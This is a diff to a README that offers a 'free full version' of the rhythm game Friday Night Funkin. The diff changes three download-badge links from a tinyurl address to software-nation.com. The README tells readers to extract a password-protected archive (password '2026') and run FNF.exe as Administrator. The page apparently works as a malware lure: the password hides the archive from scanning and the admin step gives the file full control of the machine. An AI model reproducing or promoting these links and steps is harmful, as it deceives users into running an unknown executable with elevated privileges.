@@ -9,7 +9,7 @@ The **🎤 Friday Night Funkin** is a **free** full version of the popular open-
 
 <div align="center">
 
-[![Download Friday Night Funkin](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/friday-night-funkin-free)
+[![Download Friday Night Funkin](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/friday-night-funkin-free)
 
 </div>
 
@@ -107,7 +107,7 @@ Friday Night Funkin is the hit rhythm game where you battle characters through m
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Extract → Double-click `FNF.exe` to play
 
-[![Download Friday Night Funkin](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/friday-night-funkin-free)
+[![Download Friday Night Funkin](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/friday-night-funkin-free)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -249,7 +249,7 @@ Play the hit rhythm game completely for free. **Friday Night Funkin** gives you 
 
 <div align="center">
 
-[![Download Friday Night Funkin](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/friday-night-funkin-free)
+[![Download Friday Night Funkin](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/friday-night-funkin-free)
 
 **Version 4.6.1** — Free rhythm game. April 2026 update. Zero cost. No payment.
 
